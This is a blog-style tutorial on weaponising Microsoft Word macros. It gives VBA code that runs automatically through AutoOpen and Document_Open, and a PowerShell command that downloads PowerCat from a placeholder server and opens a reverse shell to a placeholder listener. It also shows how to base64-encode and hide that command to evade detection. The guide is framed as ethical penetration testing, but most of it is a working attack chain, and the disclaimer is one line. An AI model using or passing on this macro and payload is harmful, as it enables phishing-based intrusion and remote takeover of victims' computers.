---
layout: post
title: "Windows Macro Exploitation"
date: 2024-11-01
categories: Client-Side
---

# Windows Macro Exploitation Guide

## Table of Contents

1. [Introduction to Microsoft Word Macros](#introduction-to-microsoft-word-macros)
2. [Creating a Malicious Macro](#creating-a-malicious-macro)
3. [Automating Macro Execution](#automating-macro-execution)
4. [Executing a Reverse Shell with PowerCat](#executing-a-reverse-shell-with-powercat)
5. [Summary and Considerations](#summary-and-considerations)

---

## Introduction to Microsoft Word Macros

Microsoft Word macros allow users to automate tasks in Word and Excel using Visual Basic for Applications (VBA). For ethical penetration testing, macros can be used as a vector to execute commands on a target system, provided the target enables macros when opening the document. This guide covers creating a Word macro to launch a reverse shell upon document opening.

### Key Points

- **File Types**: Use `.doc` or `.docm` formats as `.docx` does not support embedded macros.
- **Language**: VBA, with access to ActiveX objects and Windows Script Host, enables system-level command execution.
  
## Creating a Malicious Macro

1. **Create and Save Document**:
   - Open Word, create a blank document, and save it as `examplemacro.doc`.

2. **Access the Macro Editor**:
   - Go to `View > Macros > View Macros`.
   - Enter `ExampleMacro` as the macro name and select `examplemacro.doc` in the dropdown, then click **Create**.

3. **Define the Macro Code**:
   - In the Visual Basic for Applications (VBA) editor, enter the following code to launch PowerShell:

     ```vba
     Sub ExampleMacro()
         CreateObject("Wscript.Shell").Run "powershell"
     End Sub
     ```

4. **Save and Close**:
   - Save the VBA script and close the editor.

## Automating Macro Execution

To automatically execute the macro when the document opens, add `AutoOpen` and `Document_Open` subroutines. These trigger the `ExampleMacro` function on opening.

```vba
Sub AutoOpen()
    ExampleMacro
End Sub

Sub Document_Open()
    ExampleMacro
End Sub

Sub ExampleMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

## Executing a Reverse Shell with PowerCat

1. **Prepare PowerCat Command**:
   - The goal is to establish a reverse shell with PowerCat, a PowerShell tool for creating networking shells.

2. **Encode the PowerShell Command in Base64**:
   - Use a command to download and execute PowerCat. For example:

     ```powershell
     IEX(New-Object System.Net.WebClient).DownloadString('http://[YOUR_SERVER_IP]/powercat.ps1');powercat -c [YOUR_LISTENING_IP] -p [YOUR_PORT] -e powershell
     ```

   - Encode this command in Base64 to avoid detection issues:

     ```bash
     echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://[YOUR_SERVER_IP]/powercat.ps1');powercat -c [YOUR_LISTENING_IP] -p [YOUR_PORT] -e powershell" | iconv -t utf-16le | base64
     ```

3. **Split the Encoded Command for VBA**:
   - Split the Base64 string into chunks (e.g., 50 characters) for easier management in VBA:

     ```python
     str = "base64-encoded-string"
     n = 50
     for i in range(0, len(str), n):
         print("Str = Str + " + '"' + str[i:i+n] + '"')
     ```

4. **Modify Macro to Use PowerCat**:
   - Update the `ExampleMacro` function to use the PowerCat reverse shell command:

     ```vba
     Sub ExampleMacro()
         Dim Str As String
         Str = Str + "powershell.exe -nop -w hidden -enc <base64-string>"
         CreateObject("Wscript.Shell").Run Str
     End Sub
     ```

5. **Test Execution**:
   - Start a Python web server in the directory containing `powercat.ps1` and a Netcat listener on the specified port `[YOUR_PORT]`.
   - Open the document, enable macros, and verify that the reverse shell connection is established.

## Summary and Considerations

- **Document Setup**: Macros are enabled by saving the document as `.doc` or `.docm`.
- **Automation**: Using `AutoOpen` and `Document_Open` enables macros automatically upon document opening.
- **Execution**: Base64 encoding bypasses certain restrictions and simplifies passing complex PowerShell commands.
- **Ethical Use**: Only use this method in controlled, authorized testing environments to avoid legal repercussions.
